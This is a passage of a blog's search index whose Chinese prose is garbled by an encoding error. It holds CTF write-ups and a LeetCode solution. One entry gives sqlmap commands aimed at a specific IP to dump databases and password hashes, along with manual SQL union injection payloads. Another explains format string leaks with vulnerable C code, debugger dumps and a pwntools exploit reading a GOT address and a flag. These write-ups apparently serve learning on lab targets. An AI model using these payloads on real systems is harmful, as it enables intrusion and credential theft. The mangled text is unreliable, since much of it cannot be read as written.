ÁàÜÊï∞ÊçÆÂ∫ì python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs ÊåáÂÆöÊï∞ÊçÆÂ∫ìÊä•Ë°®ÁàÜË°® python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables ÊåáÂÆöÊï∞ÊçÆÂ∫ìÂíåË°®ÁàÜÂ≠óÊÆµ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns ÊåáÂÆöÊï∞ÊçÆÂ∫ìÔºåË°®ÔºåÂ≠óÁ¨¶ÁÑ∂ÂêédumpÂá∫Êï∞ÊçÆ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump ![member](https://i.imgur.com/iRvoAHX. 123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ Ëß£ÂØÜ‰πãÂêéÊòØ106370 ËøôÊ†∑Â∞±ËÉΩÁôªÈôÜÂêéÂè∞‰∫Ü Â§™Á•ûÂ•á‰∫Ü ÂèÇËÄÉ sqlmap‰πã(ÂÖ≠)----POSTÁôªÈôÜÊ°ÜÊ≥®ÂÖ•ÂÆûÊàò SQLÊâãÂ∑•Ê≥®ÂÖ•ÊºèÊ¥ûÊµãËØï(AccessÊï∞ÊçÆÂ∫ì) ËøôÈÅìÈ¢òÁõÆÂ∞±ÊúâÁÇπÁ•ûÂ•á‰∫Ü Á∫ØÈù†Áåú order by 4Âà§Êñ≠ÊúâÂ§öÂ∞ë‰∏™Â≠óÊÆµ ÁÑ∂Âêé new_list.asp?id=1 and exists(select * from admin)Âà§Êñ≠ÊòØÂê¶Â≠òÂú®admin Êé•‰∏ãÊù•Âà§Êñ≠ÂõûÊòæ‰ΩçÁΩÆ /new_list.asp?id=1 union select 1,2,3,4 from admin Êé•‰∏ãÊù•ÁåúÊµãÂ≠óÊÆµÂÄº and exists (select id from admin) ÁàÜÂá∫Â≠óÊÆµÂÄº union select 1,username,passwd,id from admin md5Ëß£ÂØÜ‰∏Ä‰∏ãÁôªÈôÜÂ∞±Ë°å‰∫Ü ÂèÇËÄÉ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[ÈîôËß£ ÊÄé‰πàÂø´ÈÄüÂú∞Â∞ÜÈìæË°®ÂÄíÁΩÆ üòï ÊúÄÂêéËøòÊòØÂõ†‰∏∫Ê∫¢Âá∫ÁöÑÈóÆÈ¢ò ÊÄùË∑ØÔºö 12345678910111213141516171819202122‚Äã int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125; Â∞±ÊòØÂ∞ÜÂÖ∂ËΩ¨Âåñ‰∏∫Êï¥Êï∞ÔºåÂõ†‰∏∫ÈìæË°®ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÊòØÊúÄ‰Ωé‰ΩçÔºå‰πãÂêéÊòØÂçÅ‰ΩçÔºåÁôæ‰ΩçÁ≠â Â∞ÜÂæóÂà∞ÁöÑÁªìÊûúÂú®ËΩ¨Âåñ‰∏∫ÈìæË°® 1234567891011121314151617181920int result = (int) (resultl1 + resultl2);ListNode ans = new ListNode(0); //ÂÖàÂèñ‰∏Ä‰∏™Â§¥ËäÇÁÇπListNode head = ans;int length = Integer.toString(result).length();for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10;&#125; ËÆ∞ÂΩï‰∏Ä‰∏ãÂ∞ÜÊï¥Êï∞ËΩ¨‰∏∫stringÁöÑÊìç‰Ωú Integer.toString(result) Math.powÂáΩÊï∞ÁöÑËøîÂõûÂÄºÂøÖÈ°ªÊòØdoubleÁ±ªÂûãÁöÑ ‰ΩÜÊòØËøôÊ†∑‰ºöÈù¢‰∏¥‰∏Ä‰∏™ÈóÆÈ¢òÔºå‰πüÂ∞±ÊòØÊúÄÂºÄÂõæÁâáÁöÑÈÇ£‰∏™ÔºåÊ∫¢Âá∫ÔºÅ Ê≠£Ëß£ Áúã‰∫ÜÁúºÁ≠îÊ°àÔºåÊâçÊòéÁôΩËá™Â∑±‰ªéÂºÄÂßãÂ∞±ÊÉ≥Èîô‰∫Ü 1234567891011121314151617181920212223242526272829303132333435363738public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; ÊúÄÂÖ≥ÈîÆÁöÑÂ∞±ÊòØ ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== ÂÖ∂ÂÆûÂè™ÈúÄË¶Å‰ªé‰Ωé‰ΩçÂºÄÂßã‰∏Ä‰Ωç‰ΩçÁöÑÂä†‰∏äÂéªÂ∞±Â•Ω‰∫Ü„ÄÇ ÁÑ∂ÂêéÂÜçÊääÂÆÉ‰ª¨ÁªôÈìæËµ∑Êù•]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÂàÜÊûê]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ Ëøô‰∏™È¢òÁõÆÊòØctfwiki‰∏äÁöÑ c‰ª£Á†ÅÂ¶Ç‰∏ãÔºö 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; ÔºàÁ™ÅÁÑ∂ÂèëÁé∞ËÖæËÆØÊñáÊ°£Â±ÖÁÑ∂ËøòÊîØÊåÅ‰ª£Á†ÅÂ•ΩÂº∫Âïä Êàë‰ª¨ÁºñËØë‰∏Ä‰∏ãÔºö 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g Êää‰øùÊä§Êé™ÊñΩÈÉΩÂÖ≥Êéâ‰∫Ü 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ÂÖàÁúã‰∏Ä‰∏ãÂá†‰∏™payload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. Âú®printfÂ§Ñ‰∏ãÊñ≠ÁÇπ Ê≠§Êó∂Ê†à‰∏äÁöÑÂ∏ÉÂ±ÄÂ¶Ç‰∏ã 12345600:0000‚îÇ esp 0xffffcf9c ‚Äî‚ñ∏ 0x80484ea (main+100) ‚óÇ‚Äî add esp, 0x2001:0004‚îÇ 0xffffcfa0 ‚Äî‚ñ∏ 0x8048593 ‚óÇ‚Äî and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008‚îÇ 0xffffcfa4 ‚óÇ‚Äî 0x103:000c‚îÇ 0xffffcfa8 ‚óÇ‚Äî 0x22222222 ('""""')04:0010‚îÇ 0xffffcfac ‚óÇ‚Äî 0xffffffff05:0014‚îÇ 0xffffcfb0 ‚Äî‚ñ∏ 0xffffcfc0 ‚óÇ‚Äî '%08x.%08x.%08x' continue‰∏Ä‰∏ãÔºö 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c ËæìÂá∫‰∫Ü‰ø°ÊÅØÁöÑÂêåÊó∂Ôºå ÂëΩ‰∏≠Á¨¨‰∫å‰∏™Êñ≠ÁÇπ Ê≠§Êó∂Ê†à‰∏äÁöÑÂ∏ÉÂ±ÄÂ¶Ç‰∏ãÔºö 1234567800:0000‚îÇ esp 0xffffcfac ‚Äî‚ñ∏ 0x80484f9 (main+115) ‚óÇ‚Äî add esp, 0x1001:0004‚îÇ 0xffffcfb0 ‚Äî‚ñ∏ 0xffffcfc0 ‚óÇ‚Äî '%08x.%08x.%08x'... ‚Üì03:000c‚îÇ 0xffffcfb8 ‚Äî‚ñ∏ 0xf7fcf410 ‚Äî‚ñ∏ 0x8048278 ‚óÇ‚Äî inc edi /* 'GLIBC_2.0' */04:0010‚îÇ 0xffffcfbc ‚Äî‚ñ∏ 0x804849d (main+23) ‚óÇ‚Äî add ebx, 0x1b6305:0014‚îÇ eax 0xffffcfc0 ‚óÇ‚Äî '%08x.%08x.%08x'06:0018‚îÇ 0xffffcfc4 ‚óÇ‚Äî '.%08x.%08x'07:001c‚îÇ 0xffffcfc8 ‚óÇ‚Äî 'x.%08x' Ê≠§Êó∂printfÂáΩÊï∞‰ºöÊääÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰πãÂêéÁöÑÊ†à‰∏äÁöÑ‰ø°ÊÅØÂΩì‰ΩúÂèÇÊï∞ÊâìÂç∞Âá∫Êù•Ôºö contiue‰∏Ä‰∏ã 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] ‰πãÂâçÊ†à‰∏äÁöÑ‰ø°ÊÅØÊòæÁ§∫ÁöÑ‰∏çÂÖ®ÔºåÊ†àÁöÑÂÜÖÂ≠òÂ¶Ç‰∏ãÔºö 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 ÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÂú∞ÂùÄÔºå Êàë‰ª¨ÁúãÂà∞Ê≠§Êó∂printfÂáΩÊï∞Â∞Ü0xffffcfc0 0xf7fcf410 0x0804849d ÈÉΩÊâìÂç∞Âá∫Êù•‰∫ÜÔºå ‰πüÂ∞±ÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰πãÂêéÁöÑ‰∏â‰∏™‰ΩçÁΩÆÁöÑ‰ø°ÊÅØ Êàë‰ª¨ÈÄöËøáËøôÁßçÊñπÂºèÊ≥ÑÈú≤Ê†àÁöÑ‰ø°ÊÅØÔºå‰ΩÜÊòØ‰πüÂèØ‰ª•Áõ¥Êé•ÂéªÂèñÂæóÊ†à‰∏≠Ë¢´ËßÜ‰∏∫Á¨¨n+1‰∏™ÂèÇÊï∞ÁöÑÂÄº Ëá≥‰∫é‰∏∫‰ªÄ‰πàÊòØÁ¨¨n+1, ËøôÊòØÂõ†‰∏∫Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊòØÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ ÊØîÂ¶Ç ÈÄöËøá %3$x(Ëøô‰∏™ÁöÑÂéüÁêÜÊòØÂï•Ôºü‰∏∫‰ªÄ‰πàË¶ÅÂä†$Á¨¶Âè∑) Êàë‰ª¨ÂèØ‰ª•Ê≥ÑÈú≤Ê†à‰∏äË¢´ËßÜ‰∏∫Á¨¨4‰∏™ÂèÇÊï∞ÁöÑÂÄº Ê†àÂ∏ÉÂ±ÄÂ¶Ç‰∏ãÔºö(Â∑¶ËæπÁöÑ‰∏ÄÂàóÊòØÊ†àÂú∞ÂùÄÔºå‰πüÂ∞±ÊòØÂÜÖÂ≠òÁöÑÂú∞ÂùÄÔºåÁÆ≠Â§¥‰ª£Ë°®‰∫ÜËøô‰∏™ÂÜÖÂ≠òÂçïÂÖÉÂ≠òÂÇ®ÁöÑÊï∞ÊçÆÔºåÂ¶ÇÊûúÊòØÊåáÈíàËøò‰ºöËøõ‰∏ÄÊ≠•ÊåáÁ§∫) 1234567800:0000‚îÇ esp 0xffffcfac ‚Äî‚ñ∏ 0x80484f9 (main+115) ‚óÇ‚Äî add esp, 0x1001:0004‚îÇ 0xffffcfb0 ‚Äî‚ñ∏ 0xffffcfc0 ‚óÇ‚Äî '%3$x'... ‚Üì(ËøôÈáåÊòØÁúÅÁï•Âè∑ÔºåÊòØ‰∏çÊòØÂ∞±ÊòØÁõ¥Êé•ÊåáÂêë‰∫ÜÔºå‰∏≠Èó¥ÈÇ£‰∏™Â∞±Ë¢´Ë∑≥Ëøá‰∫Ü)03:000c‚îÇ 0xffffcfb8 ‚Äî‚ñ∏ 0xf7fcf410 ‚Äî‚ñ∏ 0x8048278 ‚óÇ‚Äî inc edi /* 'GLIBC_2.0' */04:0010‚îÇ 0xffffcfbc ‚Äî‚ñ∏ 0x804849d (main+23) ‚óÇ‚Äî add ebx, 0x1b6305:0014‚îÇ eax 0xffffcfc0 ‚óÇ‚Äî '%3$x'06:0018‚îÇ 0xffffcfc4 ‚óÇ‚Äî 0x007:001c‚îÇ 0xffffcfc8 ‚Äî‚ñ∏ 0xf7ffd940 ‚óÇ‚Äî 0x0 ÂêåÊ†∑Áúã‰∏çÊ∏ÖÔºå ËøòÊòØÁõ¥Êé•ÊâìÂç∞ÂÜÖÂ≠ò‰ø°ÊÅØÂêß(xÂëΩ‰ª§ÁöÑÁî®Ê≥ïÔºåËøôÈáåÊòæÁ§∫ÁöÑÊòØÂÜÖÂ≠òÂú∞ÂùÄ‰ªé0xffffcfb0ÂºÄÂßãÁöÑÔºåÂõ†‰∏∫ÂÜÖÂ≠òÊòØÊåâÁÖßÂ≠óËäÇÁºñÂùÄÁöÑÔºåÊâÄ‰ª•‰∏ÄË°åÊ≠£Â•ΩÊòØ16‰∏™Â≠óËäÇÂÜÖÂ≠òÂú∞ÂùÄÂ∞±ÊòØÂä†10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0Ëøô‰∏™ÂÜÖÂ≠òÂçïÂÖÉÊåáÂêë‰∫Ü0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (ÁúãÂÜÖÂ≠òÂçïÂÖÉ0xffffcfc0Â≠òÊîæÁöÑÂÜÖÂÆπÂ∞±ÊòØx$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 ÁåúÁåúËøôÊó∂ÂÄôÊâìÂç∞ÁöÑ‰ø°ÊÅØÊòØÂï•Ôºü Á≠îÊ°àÊòØÊ†à‰∏äË¢´ËßÜ‰∏∫Á¨¨Âõõ‰∏™ÂèÇÊï∞ÁöÑ‰ø°ÊÅØÔºö 0x0804849d ÂêåÊ†∑ÁöÑÊàë‰ª¨ËøòÂèØ‰ª•ÈÄöËøá%sÊù•ÂæóÂà∞Â≠óÁ¨¶‰∏≤ÁöÑ‰ø°ÊÅØ Ê†àÂ∏ÉÂ±ÄÂ¶Ç‰∏ãÔºö 1234567800:0000‚îÇ esp 0xffffcfac ‚Äî‚ñ∏ 0x80484f9 (main+115) ‚óÇ‚Äî add esp, 0x1001:0004‚îÇ 0xffffcfb0 ‚Äî‚ñ∏ 0xffffcfc0 ‚óÇ‚Äî 0x7325 /* '%s' */... ‚Üì03:000c‚îÇ 0xffffcfb8 ‚Äî‚ñ∏ 0xf7fcf410 ‚Äî‚ñ∏ 0x8048278 ‚óÇ‚Äî inc edi /* 'GLIBC_2.0' */04:0010‚îÇ 0xffffcfbc ‚Äî‚ñ∏ 0x804849d (main+23) ‚óÇ‚Äî add ebx, 0x1b6305:0014‚îÇ eax 0xffffcfc0 ‚óÇ‚Äî 0x7325 /* '%s' */06:0018‚îÇ 0xffffcfc4 ‚óÇ‚Äî 0x107:001c‚îÇ 0xffffcfc8 ‚Äî‚ñ∏ 0xf7ffd940 ‚óÇ‚Äî 0x0 ËøòÊòØÁúã‰∏çÊ∏ÖÔºåÁõ¥Êé•ÁúãÂÜÖÂ≠òÂêß(md ÂûÉÂúæpwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 Ëøô‰∏™Êó∂ÂÄô‰ºöÁõ¥Êé•Â∞Ü 0xffffcfc0 ÂØπÂ∫îÁöÑÂ≠óÁ¨¶‰∏≤ÊâìÂç∞Âá∫Êù• ÁªìÊûúËá™ÁÑ∂Â∞±ÊòØ %s‰∫Ü Â¶ÇÊûúÊàë‰ª¨ËæìÂÖ•%2$s, Ëøô‰∏™Êó∂ÂÄôÂ∞±ÂæàÊúâË∂£‰∫ÜÔºå ÊåâÁÖßÈÅìÁêÜÁ®ãÂ∫è‰ºöÂ∞Ü 0xf7fcf410 ÂØπÂ∫îÂú∞ÂùÄÁöÑÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤ÊâìÂç∞Âá∫Êù•Ôºå ÂèØÊòØÂ¶ÇÊûúËøô‰∏™Âú∞ÂùÄÊó†ÊïàÂë¢Ôºü ÊàëËá™Â∑±Â∞ùËØïÁöÑÁªìÊûúÊòØÁõ¥Êé•ÈÄÄÂá∫‰∫ÜÔºå‰ªÄ‰πàÈÉΩÊ≤°ÊúâÊâìÂç∞Âá∫Êù•emm ËøôÊó∂ÂÄôÂ¶ÇÊûúÊàë‰ª¨ÊåáÂÆö‰∏Ä‰∏™ÂêàÊ≥ïÁöÑÂú∞ÂùÄÔºå ÊØîÂ¶ÇgotË°®‰∏≠Êüê‰∏™ÂáΩÊï∞ÁöÑÂú∞ÂùÄËøôÂ∞±ÂæàÁ•ûÂ•á‰∫Ü expÂ¶Ç‰∏ãÔºö 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #Ëøô‰∏§‰∏™payloadÊòØËá™Â∑±ÊµãËØïÁöÑpayload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() Êàë‰ª¨ËøêË°åËøô‰∏™exp Âú®pwndbg‰∏≠‰∏ãÊñ≠ÁÇπ ËøêË°åÂà∞Á¨¨‰∫å‰∏™printfÁöÑÊó∂ÂÄô 123456789‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ00:0000‚îÇ esp 0xffa3bdfc ‚Äî‚ñ∏ 0x80484f9 (main+115) ‚óÇ‚Äî add esp, 0x1001:0004‚îÇ 0xffa3be00 ‚Äî‚ñ∏ 0xffa3be10 ‚Äî‚ñ∏ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) ‚Äî‚ñ∏ 0xf7df2bb0 (__isoc99_scanf) ‚óÇ‚Äî push ebp... ‚Üì03:000c‚îÇ 0xffa3be08 ‚Äî‚ñ∏ 0xf7f85410 ‚Äî‚ñ∏ 0x8048278 ‚óÇ‚Äî inc edi /* 'GLIBC_2.0' */04:0010‚îÇ 0xffa3be0c ‚Äî‚ñ∏ 0x804849d (main+23) ‚óÇ‚Äî add ebx, 0x1b6305:0014‚îÇ eax 0xffa3be10 ‚Äî‚ñ∏ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) ‚Äî‚ñ∏ 0xf7df2bb0 (__isoc99_scanf) ‚óÇ‚Äî push ebp06:0018‚îÇ 0xffa3be14 ‚óÇ‚Äî '%4$s'07:001c‚îÇ 0xffa3be18 ‚Äî‚ñ∏ 0xf7fb3900 (catch_hook) ‚óÇ‚Äî 0x0 Âè¶‰∏ÄËæπ 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a ‚îÇ¬∑¬∑¬∑¬∑‚îÇ%4$s‚îÇ¬∑‚îÇ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 ‚îÇ0000‚îÇ0001‚îÇ.222‚îÇ2222‚îÇ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 ‚îÇ2.ff‚îÇffff‚îÇff.¬∑‚îÇ¬∑¬∑¬∑%‚îÇ 00000020 34 24 73 0a ‚îÇ4$s¬∑‚îÇ‚îÇ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑+¬∑¬∑‚îÇ‚îÇ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive Ëøô‰∏™Êó∂ÂÄôÊàë‰ª¨Â∞±ÂæóÂà∞‰∫ÜscanfÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰∫Ü ok ËøòÊúâÂá†‰∏™Âú∞ÊñπÊ≤°ÂºÑÊòéÁôΩ‰πãÂêéÂÜçÂÜô Á°ÆÂÆöÂèØÊéßÂà∂Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰ΩçÁΩÆÁöÑÊñπÊ≥ï Êó¢ÁÑ∂Á®ãÂ∫èÊòØÊúâÊºèÊ¥ûÁöÑÔºåÊàë‰ª¨Â∞±ÂøÖÈ°ªÁü•ÈÅìÂèØË¢´ÊéßÂà∂ÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑ‰ΩçÁΩÆÔºåËøôÊó∂ÂÄôÂ§ßËá¥Êúâ‰ª•‰∏ãÂá†ÁßçÂßøÂäø ÊûÑÈÄ†Á±ª‰ºº [tag]%p%p%p%p%p%p...ËøôÊ†∑ÁöÑÂèÇÊï∞ Pwngdb‰∏≠Êúâ‰∏Ä‰∏™Âè´ÂÅöfmargÂèØ‰ª•Áî®Êù•Ëé∑ÂèñÊåáÂÆöÂú∞ÂùÄÂà∞Â∫ïÊòØÁ¨¨Âá†‰∏™ÂèÇÊï∞ ‰∏çÊòØÂæàÁêÜËß£Á¨¨‰∏ÄÁßçÊñπÊ≥ïÂéüÁêÜÔºå‰ΩÜÊòØÁ¨¨‰∫åÁßçÊñπÊ≥ïÊØîËæÉÂ•ΩÁî® ‰∏çËøáÊàë‰ª¨ÂèØ‰ª•Êù•Áúã‰∏Ä‰∏™‰æãÂ≠êÔºö IDA‰∏≠ÁöÑC‰ª£Á†ÅÔºö 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; ÊòæÁÑ∂ÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û Êàë‰ª¨ÈúÄË¶ÅÂú®printfÂáΩÊï∞Â§Ñ‰∏ãÊñ≠ÁÇπ ÁÑ∂ÂêéÈöè‰æøËæìÂÖ•‰∏Ä‰∫õÊï∞Â≠ó: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. ËøôÊó∂ÂÄôÂèØ‰ª•ÁúãÂà∞flag‰∫ÜÔºåÊ≥®ÊÑèÊàë‰ª¨ÊòØÂú®Êú¨Âú∞Ë∞ÉËØïÔºåË∞ÉËØïÁöÑÊó∂ÂÄôÂΩìÁÑ∂ÂèØ‰ª•ÁúãÂà∞flagÔºå‰∏ÄËà¨ÁöÑpwnÈ¢òÈÉΩÊòØË¶ÅËøúÁ®ãËøûÊé•ÁöÑ Â¶ÇÊûúÊàë‰ª¨Ë¶ÅÊ≥ÑÈú≤flagÁöÑÂÄºÔºåÂ∞±ÈúÄË¶ÅÊûÑÈÄ†%n$sËøôÊ†∑ÁöÑ‰º†ËøõÂéª„ÄÇÊâÄ‰ª•Ëé∑ÂèñÂèÇÊï∞ÁöÑ‰ΩçÁΩÆÂæàÂÖ≥ÈîÆ 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") ÈÄöËøáPwngdbÂ∞±ÂèØ‰ª•Êü•ÁúãÂèÇÊï∞ÁöÑ‰ΩçÁΩÆ‰∫Ü ËøôÊó∂ÂÄôËøêË°å 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;ÔøΩÔøΩÔøΩBut that was totally wrong lol get rekt Â∞±ÂæóÂà∞‰∫Üflag 